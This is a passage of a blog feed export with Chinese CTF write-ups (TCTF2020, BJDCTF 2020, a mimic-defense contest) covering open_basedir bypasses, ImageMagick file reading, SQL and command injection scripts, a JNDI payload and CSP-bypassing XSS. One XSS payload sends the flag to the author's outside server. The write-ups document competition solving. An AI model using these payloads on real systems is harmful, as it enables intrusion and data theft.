id="GD库imageftbbox-imagefttext列举目录"><a href="#GD库imageftbbox-imagefttext列举目录" class="headerlink" title="GD库imageftbbox/imagefttext列举目录"></a>GD库imageftbbox/imagefttext列举目录</h2><pre><code class="php">&lt;?phpini_set(&#39;open_basedir&#39;, dirname(__FILE__));printf(&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;, ini_get(&#39;open_basedir&#39;));set_error_handler(&#39;isexists&#39;);$dir = &#39;d:/test/&#39;;$file = &#39;&#39;;$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;for ($i=0; $i &lt; strlen($chars); $i++) {     $file = $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;    //$m = imagecreatefrompng(&quot;zip.png&quot;);    //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#39;aaa&#39;);    imageftbbox(100, 100, $file, &#39;aaa&#39;);}function isexists($errno, $errstr){    global $file;    if (stripos($errstr, &#39;Invalid font filename&#39;) === FALSE) {        printf(&quot;%s&lt;br/&gt;&quot;, $file);    }}?&gt;</code></pre><h2 id="bindtextdomain暴力猜解目录"><a href="#bindtextdomain暴力猜解目录" class="headerlink" title="bindtextdomain暴力猜解目录"></a>bindtextdomain暴力猜解目录</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630132038.png" alt="image19658"></p><p> 如上图，这个函数第二个参数<code>$directory</code>是一个文件路径。它会在<code>$directory</code>存在的时候返回<code>$directory</code>，不存在则返回false。 </p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a> </p><p> <a href="https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain" target="_blank" rel="noopener">https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/06/30/bypass_disable_function_open_basedir/">https://www.ccreater.top/2020/06/30/bypass_disable_function_open_basedir/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tctf2020</title>
      <link href="2020/06/30/tctf2020/"/>
      <url>2020/06/30/tctf2020/</url>
      
        <content type="html"><![CDATA[<h1 id="tctf2020"><a href="#tctf2020" class="headerlink" title="tctf2020"></a>tctf2020</h1><p>好难.jpg</p><h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>这题在我们一堆人的群殴下才做出来</p><p>题目主要的http请求是：</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629195954.png" alt="image130"></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200021.png" alt="image216"></p><p>与</p><pre><code>http://pwnable.org:5000/image/VMyeGe/xxxxxx是后缀，具体列表在：https://imagemagick.org/script/formats.php</code></pre><h3 id="第一部分-ImageMagick读取文件"><a href="#第一部分-ImageMagick读取文件" class="headerlink" title="第一部分 ImageMagick读取文件"></a>第一部分 ImageMagick读取文件</h3><p>测试share发现，无论我们输入的previewid时候存在，都会生成一个短链</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200254.png" alt="image480"></p><p>访问对应的png界面时: <a href="http://pwnable.org:5000//image/ZpVQfl/png" target="_blank" rel="noopener">http://pwnable.org:5000//image/ZpVQfl/png</a> </p><p>返回报错</p><pre><code>{&quot;error&quot;: &quot;Convert exception: unable to open image `previews/testting&#39;: No such file or directory @ error/blob.c/OpenBlob/2874&quot;}</code></pre><p>根据报错猜测是ImageMagick 来转换成对应的后缀</p><p>fuzz后缀后发现：</p><pre><code>http://pwnable.org:5000/image/FdrpgF/htm</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200643.png" alt="image857"></p><p>根据preview返回的数据，后端估计是先生成一个svg,再转化为其他的格式</p><p>我们再看看他们是如何传递并表示表情的</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629200926.png" alt="image1001"></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201154.png" alt="image1085"></p><p>发现</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629201349.png" alt="image1173"></p><p>修改[]里的值可以逃出引号的限制</p><pre><code>[{&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;}]</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629225818.png" alt="image1437"></p><p>搜索<strong>ImageMagick convert ctf</strong> 发现，ImageMagick convert可以<a href="https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/" target="_blank" rel="noopener">读取文件</a></p><p>构造:</p><pre><code>------WebKitFormBoundaryHJ88AZN7Content-Disposition: form-data; name=&quot;data&quot;[{&quot;type&quot;:0,&quot;message&quot;:&quot;[\&quot; href=\&quot;text:/etc/passwd\&quot; onerror=\&quot;//]&quot;}]------WebKitFormBoundaryHJ88AZN7--</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230827.png" alt="image1845"></p><p>测试常见的文件后找到源文件：app.py</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230936.png" alt="image1953"></p><p>这里我们重点关注responseJSON和 secret这两个函数</p><h3 id="第二部分-xss管理员"><a href="#第二部分-xss管理员" class="headerlink" title="第二部分 xss管理员"></a>第二部分 xss管理员</h3><p>secret是让我们xss管理员，但是存在csp:</p><pre><code>img-src * data:; default-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;</code></pre><p>responseJSON可以让我们在json数据前加上xxx=,结合报错返回的数据是json格式，如果我们能控制报错信息，我们就能绕过csp</p><p>前文发现 ImageMagick 的那个接口(share)刚好可以控制报错信息</p><pre><code>previewid=`test&quot;},alert(1),{&quot;2&quot;:&quot;</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231535.png" alt="image2409"></p><p>接着就是让htm包含它：</p><pre><code>[{&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;/static/css/bootstrap.min.css\&quot;&gt;&lt;script ssrcrc=\&quot;/static/js/jquery-3.5.1.min.js\&quot;&gt;&lt;/script&gt;&lt;script ssrcrc=\&quot;/static/js/bootstrap.min.js\&quot;&gt;&lt;/script&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;}]</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231806.png" alt="image2848"></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231854.png" alt="image2936"></p><h3 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h3><p>一叶飘零大大的wp：</p><p> <a href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator" target="_blank" rel="noopener">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator</a> </p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><pre><code> &lt;?phpif (isset($_GET[&#39;rh&#39;])) {    eval($_GET[&#39;rh&#39;]);} else {    show_source(__FILE__);}</code></pre><p>很简单的源代码,首先查看phpinfo:</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629232130.png" alt="image3265"></p><p>open_basedir: /var/www/html 且该目录不可写，twitter上那个绕过open_basedir的方法就没用了</p><p>利用</p><pre><code>$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f){echo($f-&gt;__toString().&#39; &#39;);};</code></pre><p>列目录：</p><pre><code>bin dev etc flag.h flag.so home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var</code></pre><p>看到flag.h+flag.so+ffi猜测是要用ffi来加载flag.h然后执行其中的方法，</p><p>测试后发现 ffi::load 无视open_basedir ,但是只能加载 /flag.h</p><p>当我们又不知道flag.h中的函数定义。。。。。。</p><p>后来这题是因为别人把题目打穿了，全场绕过open_basedir，读取了flag</p><h2 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h2><p>这题听说是因为出题人因为easyphp重出的题目</p><p>这里就要直面刚刚明明无法读取flag.h又要了解flag.h中的函数声明</p><p>因为这里有ffi，可以直接操作系统的底层，我们试试内存泄露</p><pre><code class="php">$c=FFI::load(&quot;/flag.h&quot;);$b=FFI::cast(&quot;void *&quot;,FFI::new(&quot;int[1]&quot;,false));$a=FFI::string($b-400000,400000);var_dump($a);</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000339.png" alt="image4044"></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000414.png" alt="image4128"></p><p>好玩.jpg</p><h2 id="Cloud-Computing"><a href="#Cloud-Computing" class="headerlink" title="Cloud Computing"></a>Cloud Computing</h2><pre><code class="php">&lt;?php mkdir(&#39;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#39;);chdir(&#39;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;/flag&#39;));</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/06/30/tctf2020/">https://www.ccreater.top/2020/06/30/tctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拟态防御记录</title>
      <link href="2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/"/>
      <url>2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p> ./sancheck.php</p><pre><code class="go">package mainimport (    &quot;fmt&quot;    &quot;io/ioutil&quot;    &quot;log&quot;    &quot;net/http&quot;    &quot;net/url&quot;    &quot;strings&quot;)var (    secret   = &quot;xiaomo.wabzsy&quot;    banner   = &quot;Golang HTTP Server (v2.3.3)&quot;    template = `&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;San Check&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form method=&quot;POST&quot;&gt;            &lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt;            &lt;input type=&quot;submit&quot; value=&quot;淦!&quot; /&gt;        &lt;/form&gt;        &lt;pre&gt;%s        &lt;/pre&gt;    &lt;/body&gt;    &lt;!-- ./sancheck.php --&gt;&lt;/html&gt;`)func SanCheck(input string) error {    u, err := url.Parse(input)    if err != nil {        return err    }    if u.Scheme != &quot;http&quot; {        return fmt.Errorf(&quot;err: Invalid Scheme [%s]&quot;, u.Scheme)    }    if u.Opaque != &quot;&quot; {        return fmt.Errorf(&quot;err: WHAT AER YOU DOING ?!!! (%s)&quot;, u.Opaque)    }    if u.Hostname() != &quot;127.0.0.1&quot; {        return fmt.Errorf(&quot;err: Invalid Hostname [%s]&quot;, u.Hostname())    }    if u.Port() != &quot;&quot; &amp;&amp; u.Port() != &quot;80&quot; {        return fmt.Errorf(&quot;err: Invalid Port [%s]&quot;, u.Port())    }    if u.User == nil {        return fmt.Errorf(&quot;err: Authorization Required&quot;)    }    if u.User.Username() != &quot;root&quot; {        return fmt.Errorf(&quot;err: Invalid Username [%s]&quot;, u.User.Username())    }    if password, set := u.User.Password(); !set || password != &quot;P@ssw0rd!&quot; {        return fmt.Errorf(&quot;err: Invalid Password [%s]&quot;, password)    }    if u.RequestURI() != &quot;/flag.php&quot; {        return fmt.Errorf(&quot;err: Invalid RequestURI [%s]&quot;, u.RequestURI())    }    if u.Fragment != &quot;&quot; {        return fmt.Errorf(&quot;err: Invalid Fragment [%s]&quot;, u.Fragment)    }    if !strings.Contains(u.String(), &quot;&#39;Pwned!&#39;&quot;) {        return fmt.Errorf(&quot;err: San Check failed&quot;)    }    return nil}func DefaultHandler(w http.ResponseWriter, req *http.Request) {    input := req.PostFormValue(&quot;url&quot;)    if input == &quot;&quot; {        Response(w, template, &quot;Where is the flag?&quot;)        return    }    if err := SanCheck(input); err == nil {        req, _ := http.NewRequest(&quot;GET&quot;, input, nil)        req.Header.Add(&quot;Secret&quot;, secret)        if resp, err := (&amp;http.Client{}).Do(req); err == nil {            if body, err := ioutil.ReadAll(resp.Body); err == nil {                Response(w, template, string(body))            }            _ = resp.Body.Close()        } else {            Response(w, template, err.Error())        }    } else {        Response(w, template, err.Error())    }}func FlagHandler(w http.ResponseWriter, req *http.Request) {    if strings.Join(req.Header[&quot;Secret&quot;], &quot;&quot;) != secret {        Forbidden(w)    } else if !strings.HasPrefix(req.RemoteAddr, &quot;127.0.0.1&quot;) {        Forbidden(w)    } else {        Response(w, &quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;, readFlag())    }}func readFlag() string {    if bs, err := ioutil.ReadFile(&quot;./flag.txt&quot;); err == nil {        return string(bs)    } else {        return fmt.Sprintf(&quot;Unable to read flag.txt, please contact technical support.(%s)&quot;, err.Error())    }}func CodeHandler(w http.ResponseWriter, _ *http.Request) {    w.Header().Set(&quot;Content-Type&quot;, &quot;text/plain; charset=utf-8&quot;)    w.Header().Set(&quot;Server&quot;, banner)    if bs, err := ioutil.ReadFile(&quot;main.go&quot;); err == nil {        _, _ = w.Write(bs)    } else {        _, _ = w.Write(            []byte(                fmt.Sprintf(&quot;Unable to read main.go, please contact technical support.(%s)&quot;,                    err.Error(),                ),            ),        )    }}func Forbidden(w http.ResponseWriter) {    w.WriteHeader(403)    Response(w, &quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;, &quot;403 Forbidden&quot;)}func Response(w http.ResponseWriter, tpl string, response string) {    w.Header().Set(&quot;Content-Type&quot;, &quot;text/html; charset=utf-8&quot;)    w.Header().Set(&quot;Server&quot;, banner)    if _, err := fmt.Fprintf(w, tpl, response); err != nil {        log.Println(err)    }}func main() {    http.HandleFunc(&quot;/&quot;, DefaultHandler)    http.HandleFunc(&quot;/flag.php&quot;, FlagHandler)    http.HandleFunc(&quot;/sancheck.php&quot;, CodeHandler)    log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))}</code></pre><p>根据issue<a href="https://github.com/golang/go/issues/29098" target="_blank" rel="noopener">https://github.com/golang/go/issues/29098</a> 绕过</p><p><code>http://root:P@ssw0rd!@127.0.0.1]&#39;Pwned!&#39;]:80/flag.php#</code></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><a href="mailto:ccreater@163.com">ccreater@163.com</a>  E6N0HT aa05940594</p><p>cmd={“/expandocolumn/add-column”:{}}&amp;p_auth=Gyr2NhlX&amp;formDate=1585307550388&amp;tableId=1&amp;name=1&amp;type=1&amp;+defaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={“jndiName”:”ldap://127.0.0.1:1389/Object”,”loginTimeout”:0}</p><h2 id="白盒拟态路由"><a href="#白盒拟态路由" class="headerlink" title="白盒拟态路由"></a>白盒拟态路由</h2><pre><code>vtyshconf tip route 200.14.1.0/24 x.x.x.x</code></pre><h2 id="白盒拟态域名服务器"><a href="#白盒拟态域名服务器" class="headerlink" title="白盒拟态域名服务器"></a>白盒拟态域名服务器</h2><p>上传busybox 来使用nslookup等命令</p><pre><code>cat /etc/name.conf根据配置修改sudo /usr/local/bind-9.11.19/bin/named/namedbusybox nslookup www.test.com 172.29.126.2 看结果</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/06/23/拟态防御记录/">https://www.ccreater.top/2020/06/23/拟态防御记录/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf,wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020第三届BJDCTF</title>
      <link href="2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/"/>
      <url>2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="2020BJDCTF第三届"><a href="#2020BJDCTF第三届" class="headerlink" title="2020BJDCTF第三届"></a>2020BJDCTF第三届</h1><h2 id="帮帮小红花"><a href="#帮帮小红花" class="headerlink" title="帮帮小红花"></a>帮帮小红花</h2><pre><code class="php"># -*-coding:utf-8 -*-import requestsimport reflag_format = re.compile(&#39;flag\\{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\}&#39;)all_letter = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789abcdefghijklmnopqrstuvwxyz()}{_&#39;def get_flag(command):    try:        r = requests.get(&#39;http://183.129.189.60:10071&#39;, params={&#39;imagin&#39;: command}, timeout=9)    except:        return True    return Falseif __name__ == &#39;__main__&#39;:    flag = &#39;BJD{make_iptables_great_again}&#39;    while flag_format.match(flag) == None:        staus = 0        for i in all_letter:            payload = &#39;cat /flag|grep %s &amp;&amp;sleep 10&#39; % (flag + i)            print(payload)            if get_flag(payload):                staus = 1                flag += i                print(flag)                break        if staus == 0:            flag = flag[0:-1]</code></pre><h2 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h2><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523090430266.png" alt="image968"></p><p>可能存在反序列化</p><p>和文件内容无关</p><p>上传文件后发现有个filename字段，show界面是直接出现图片的base64编码，如果我们能控制filename字段就有可能任意读取</p><p>当唯一麻烦的是，文件名后面有个md5校验值</p><p>但是当我们直接上传的时候她会生成一个，哪怕没上传成功</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200523095410.png" alt="image1220"></p><p>直接拿来用访问show.php就拿到flag了</p><h2 id="Multiplayer-Sports"><a href="#Multiplayer-Sports" class="headerlink" title="Multiplayer Sports"></a>Multiplayer Sports</h2><p> Powered by beego 1.12.1 </p><p><a href="http://183.129.189.60:10112/?by=desc" target="_blank" rel="noopener">http://183.129.189.60:10112/?by=desc</a></p><p>黑名单:<code>&#39;,&quot;,!,#,$,&amp;,+,;,&lt;,=,&gt;,?,@,\,|,if,exp,info,ascii,ord,sys,count,order,by,author,where</code></p><p>给了个hint:<code>table</code>,不知道啥意思</p><pre><code class="python">import requestsimport timeimport stringdef sqlinj(num):    burp0_url = &quot;http://183.129.189.60:10117/&quot;    param={&quot;by&quot;:&quot;,extractvalue(1,(case when ((select conv(right(left(hex( (select group_concat(a,b) from (select 1`a`,2`b` union select * from hint )`ff` ) ),{POS}),2),16,10)  )-{GUESS}) then 1 ELSE user() end))&quot;.format(POS=pos,GUESS=num)}    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAABj/4IBA2FhYQEDYmJiATIuL3VwbG9hZHMvM2UxMDRjYWU2NDAxZDI1NzY2NzZiMmM2ODk3MzE1NGQvcTEuanBnASBhMjVhY2E4OGZkOGYzYjYyMTkyZTYxNzgwMDYzNWQ4NAA=&quot;, &quot;_xsrf&quot;: &quot;azI3QUxLb3JwTDh5MFI5aXlPM1ZOQ2Y4UnNUSkVnY3E=|1590202537824785027|837f32c5f7f2b6c2a5ad0ffbcc803dff791bb5a078a0b68ea40428f37dfdf2ae&quot;}    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param)    time.sleep(0.5)    print(param)    if &quot;/static/img/dundundun.gif&quot; in r.text:        print(&quot;filter &quot;,param)        exit()    if &quot;y1ng&quot; in r.text:        return False    else :        return True#database: ms#mysql,sys#Hint: /Source Password#table:gtid_executed,sys_configresult=&quot;12,Hint: /Source Password: T1Me&quot;pos=len(result)*2+2while True:    flag=False    for i in string.printable:        if sqlinj(ord(i)):            result+=i            print(&quot;Found:&quot;+result)            flag=True            break        print(&quot;result:&quot;+result)    pos+=2    if flag is False:        break</code></pre><h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><p>flag.php</p><pre><code class="php">if ($_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;172.26.176.2&#39;) //only admin, who is at 172.26.176.2, can get FLAG    echo FLAG;else echo $_SERVER[&#39;REMOTE_ADDR&#39;];</code></pre><p>bot脚本：</p><pre><code class="php">if (isset($_POST[&#39;url&#39;]) &amp;&amp; isset($_POST[&#39;captcha&#39;]) ) { // report bug to our admin who is at 172.26.176.2, our admin will access the bug url to check    $url = $_POST[&#39;url&#39;];    $captcha = $_POST[&#39;captcha&#39;];    if ( checkNote($url) &amp;&amp; checkNote(urldecode($url)) &amp;&amp; checkURL($url) &amp;&amp;  substr(md5($captcha), 0 , 6) === $_SESSION[&#39;captcha&#39;] ) {        //admin checking, it will take several seconds    } else alertMes(&#39;something wrong&#39;, &#39;./report_bugs.php&#39;);}?&gt;</code></pre><pre><code class="php">function checkURL($url) {    if ( preg_match(&#39;/[|~`^;&amp;]/m&#39;, $url) )        return false;    else return true;}function checkNote($s) {    $filter = &#39;/show|svg|archive|error|eval|on|atob|\\\u|&amp;#|let|cookie|meta|create|fetch|f[^a-z]*l[^a-z]*a[^a-z]*g|src|append|&lt;script&gt;|func|javascript|res|lo|then|ftp|const|ajax|\$|\&#39;|\&quot;/imX&#39;;    if (preg_match($filter, $s) || strlen($s) &gt;= 500 || strlen($s) &lt;= 1) return false;    else return true;}</code></pre><p>csp:<code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; img-src &#39;self&#39;; object-src &#39;none&#39;; require-trusted-types-for &#39;script&#39;;</code></p><p>绕过</p><pre><code class="javascript">&lt;script &gt;xmlhttp=new XMLHttpRequest();xmlhttp[`\x6fnreadystatechange`]=()=&gt;{if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200){document[`\x6cocati\x6fn`][`href`]=`http://ccreat\x65r.top:60006/`+xmlhttp[`\x72espo\x6eseText`];}};xmlhttp.open(`GET`,`/lib\x2ffla\x67.php`,true);xmlhttp.send();&lt;/script&gt;</code></pre><p>拿到flag</p><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p> <a href="http://183.129.189.60:10057/" target="_blank" rel="noopener">http://183.129.189.60:10057/</a> </p><pre><code>/flag.php/index.php/log.php/login.php/www.zip</code></pre><p>flag.php</p><pre><code class="php">flag.php关键代码如下：$classname = $_GET[&#39;classname&#39;];$data = $_GET[&#39;data&#39;];$class = new $classname($data[&#39;a&#39;], $data[&#39;b&#39;]);Only users from the website can request this page. flag in /flag, have fun!</code></pre><p>先登陆康康,需要key,相关代码在:</p><pre><code class="php">&lt;?php    header(&quot;content-type:text/html;charset=utf-8&quot;);    session_start();    function getkey()    {        $key = &#39;&#39;;        $chars = str_split(&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;);        for ($i = 0; $i &lt; 48; $i++)        {            $key = $key . $chars[random_int(0, 61)];        }        $_SESSION[&#39;key&#39;] = $key;        return $key;    }    function getreferer() {        static $referer;        if (isset($_SERVER[&#39;HTTP_REFERER&#39;])) {                $referer = $_SERVER[&#39;HTTP_REFERER&#39;];            }        elseif(isset($_POST[&#39;URL_REFERER&#39;])){                $referer = $_POST[&#39;URL_REFERER&#39;];            }        else{            die(&quot;Where are you from?&quot;);        }        return $referer;    }        $key = getkey();        $url = getreferer();        if(!preg_match(&quot;/^http[s]{0,1}:\/\//i&quot;, $url)){            die(&quot;What do you want to do?&quot;);        }        $host = parse_url($url, PHP_URL_HOST);        if(preg_match(&quot;/^google\.com$/i&quot;, $host) or preg_match(&quot;/(.*)\.google\.com$/i&quot;, $host)){            $headers = get_headers($url,1);            if($headers[&#39;dd&#39;] === &#39;MeAquaNo_1!!!&#39;){                echo $key;            }            else{                echo &#39;dd beheading!&#39;;            }        }        else{            die(&quot;Only dd working at Google can get the key!&quot;);        }</code></pre><h2 id="老开发"><a href="#老开发" class="headerlink" title="老开发"></a>老开发</h2><p> <a href="http://183.129.189.60:10000/" target="_blank" rel="noopener">http://183.129.189.60:10000/</a> </p><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230022093.png" alt="image6583"></p><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230029887.png" alt="image6695"></p><p>User.php</p><pre><code class="php">&lt;?phpif ($_SERVER[&#39;SCRIPT_FILENAME&#39;] == __FILE__)    highlight_file(__FILE__);/** * @Entity * @Table(name=&quot;user&quot;) */class User{    /**      * @Id     * @Column(type=&quot;integer&quot;)     * @GeneratedValue     */    protected $uid;    /**      * @Column(type=&quot;string&quot;)      * @unique     */    protected $username;    /**      * @Column(type=&quot;string&quot;)      */    protected $password;    /**      * @Column(type=&quot;string&quot;)      */    protected $role;    public function __get($name)    {        if (property_exists(__CLASS__, $name)) {            return $this-&gt;$name;        } else {            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);        }    }    public function __set($name, $value)    {        if (property_exists(__CLASS__, $name)) {            $this-&gt;$name = $value;        } else {            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);        }    }}</code></pre><h2 id="布吉岛"><a href="#布吉岛" class="headerlink" title="布吉岛"></a>布吉岛</h2><p> <a href="http://183.129.189.60:10049/" target="_blank" rel="noopener">http://183.129.189.60:10049/</a> </p><p> <a href="http://183.129.189.60:10050/" target="_blank" rel="noopener">http://183.129.189.60:10050/</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/05/24/2020第三届BJDCTF/">https://www.ccreater.top/2020/05/24/2020第三届BJDCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass_csp</title>
      <link href="2020/05/20/bypass_csp/"/>
      <url>2020/05/20/bypass_csp/</url>
      
